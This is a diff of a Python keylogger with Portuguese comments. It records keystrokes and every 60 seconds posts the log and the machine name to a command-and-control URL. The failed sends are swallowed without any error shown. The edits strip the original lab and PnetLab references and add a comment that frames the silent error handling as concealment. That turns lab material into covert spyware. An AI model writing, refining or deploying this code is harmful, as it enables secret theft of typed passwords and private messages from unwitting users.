@@ -4,7 +4,6 @@ from threading import Timer
 import os
 
 # CONFIGURAÇÕES DO C2
-# Substitua pelo IP do seu servidor no PnetLab/Laboratório
 C2_URL = "http://192.168.100.196:80/api/logs"
 INTERVALO_ENVIO = 60 # segundos
 
@@ -14,7 +13,7 @@ def enviar_para_c2():
     global log
     if log:
         try:
-            # Enviamos os dados dentro de um dicionário (form-data)
+            # Enviando os dados dentro de um dicionário (form-data)
             payload = {
                 "keyboard_data": log,
                 "machine_name": os.getenv("COMPUTERNAME", "Linux_Machine") # Identifica a origem
@@ -25,7 +24,7 @@ def enviar_para_c2():
             if response.status_code == 200:
                 log = "" # Limpa o log se o servidor recebeu com sucesso
         except Exception:
-            # Em cibersegurança ofensiva, erros de conexão devem ser silenciosos
+            # silencia os erros para melhor ocultabilidade
             pass
     
     # Reagenda o próximo envio
@@ -54,5 +53,5 @@ if __name__ == "__main__":
         with keyboard.Listener(on_press=on_press) as listener:
             listener.join()
     except KeyboardInterrupt:
-        # Encerramento silencioso para o laboratório
+        # Encerramento silencioso
         pass
